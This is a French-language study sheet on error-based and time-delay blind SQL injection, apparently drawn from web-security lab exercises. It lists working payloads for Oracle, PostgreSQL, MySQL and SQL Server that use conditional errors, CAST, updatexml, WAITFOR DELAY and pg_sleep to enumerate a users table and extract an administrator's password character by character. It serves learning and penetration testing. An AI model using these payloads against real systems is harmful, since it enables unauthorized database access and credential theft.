# Error-Based SQL injection

L’Error-Based SQLi est une technique d’injection SQL qui consiste à provoquer une erreur volontaire pour que le serveur affiche un message contenant des informations sensibles sur la base de données.



## Objectif :

- Obtenir des infos comme : nom de la base, noms de colonnes, versions, etc.
- Rendre visibles des vulnérabilités qui étaient invisibles.


## Deux types d’erreurs exploitées:

**1. Erreur conditionnelle (Blind Error-Based)**

**Exploiting blind SQL injection by triggering conditional errors**

On déclenche une erreur seulement si une condition est vraie.


```sql
' AND (SELECT CASE WHEN (username='admin') THEN 1/0 ELSE 1 END) -- 
```
- Si admin existe → division par zéro → erreur
- Sinon → pas d’erreur

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
-- No Error

xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a 
-- Error

'||(SELECT '')||'
'||(SELECT '' FROM dual)||'
-- No Error

'||(SELECT '' FROM not-a-real-table)||'
-- Error
```

Si on a une erreur, Cela démontre qu'il est possible de déclencher une erreur conditionnellement à la véracité d'une condition spécifique.

```sql
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
-- vérifier l'existence de la table users. Comme cette requête ne renvoie pas d'erreur, vous pouvez en déduire que cette table existe bel et bien.

'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- vérifier l'existence du nom d'utilisateur : administrator. Vérifiez que la condition est vraie (l'erreur est reçue), confirmant qu'il existe un utilisateur appelé administrator.

'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- déterminer le nombre de caractères du mot de passe de l'administrator. Cette condition doit être vraie, confirmant que le mot de passe comporte plus d'un caractère.

'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- confirmer que le premier caractère du mot de passe est a
```


**2. Erreur contenant les données (Direct Error**)

**Extracting sensitive data via verbose SQL error messages**

On peut inciter l'application à générer un message d'erreur contenant certaines données renvoyées par la requête. 

Cela transforme ainsi une vulnérabilité d'injection SQL, jusque-là aveugle, en une vulnérabilité visible.

On peut utiliser la fonction `CAST()` qui permet de convertir un type de données en un autre.

```sql
' AND CAST((SELECT 1) AS int)--
-- Vous obtenez maintenant une erreur différente indiquant qu'une ANDcondition doit être une expression booléenne.

' AND 1=CAST((SELECT 1) AS int)--
-- vous ne recevez plus d'erreur

' AND 1=CAST((SELECT username FROM users) AS int)--
-- récupère les noms d'utilisateur de la base de données

' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
-- renvoyer qu'une seule ligne

' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

-- divulguer son mot de passe
```


```sql
' AND updatexml(null, concat(0x7e, (SELECT database()), 0x7e), null) -- 
```

- Affiche le nom de la base dans l’erreur.
- Utilisé pour extraire des données directement via les messages d’erreur.

**Exploiting blind SQL injection by triggering time delays**

Si l'application détecte les erreurs de base de données lors de l'exécution de la requête SQL et les gère correctement, la réponse de l'application ne sera pas modifiée. Cela signifie que la technique précédente d'induction d'erreurs conditionnelles ne fonctionnera pas.

Dans ce cas, il est souvent possible d'exploiter la vulnérabilité d'injection SQL aveugle en déclenchant des délais selon que la condition injectée est vraie ou fausse.

Cela permet de déterminer la véracité de la condition injectée en fonction du temps nécessaire à la réception de la réponse HTTP.

> Les techniques de déclenchement d'un délai sont spécifiques au type de base de données utilisé.


```sql
-- sur Microsoft SQL Server,
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--

-- sur PostgreSQL
';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--

'||pg_sleep(10)--
```

- La première de ces entrées ne déclenche pas de délai, car la condition 1=2 est fausse.
- La deuxième entrée déclenche un délai de 10 secondes, car la condition 1=1 est vraie.

```sql
';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
-- délai de 10s si administrator existe

';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
-- délai de 10s, confirmant que le mot de passe comporte plus d'un caractère.

'; IF (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
-- délai de 10s, pour chaque caractere valide pour récupérer des données en testant un caractère à la fois cela teste le caractère à chaque position pour déterminer sa valeur.
```

